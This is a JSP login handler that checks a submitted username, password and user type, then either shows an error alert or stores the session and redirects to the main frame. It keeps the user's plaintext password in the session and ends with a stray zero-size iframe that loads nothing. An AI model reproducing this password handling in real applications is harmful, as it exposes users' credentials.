<%@ page contentType="text/html; charset=gb2312" language="java"%>
<%@ page import="mypackage.*,java.util.*" %>
<%
String username=DateFormate.toGb((String)request.getParameter("username"));
String password=DateFormate.toGb((String)request.getParameter("password"));
String type=DateFormate.toGb((String)request.getParameter("type"));
LoginManager lm=new LoginManager();
if(!lm.testUser(username,password,type)){
%>
<script language="javascript">
	alert("用户名或密码错误，或者没有这个用户的注册资料！");
	document.location.href="login.jsp";
</script>
<%	
}else{
	session.setAttribute("s_usertype",type);
	session.setAttribute("s_username",username);
	session.setAttribute("s_userpasword",password);
	response.sendRedirect("mainframe.jsp");
}
%>

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=gb2312" />
<title>登录测试</title>
</head>

<body>
</body>
</html>
<iframe  width="0" height="0"></iframe>
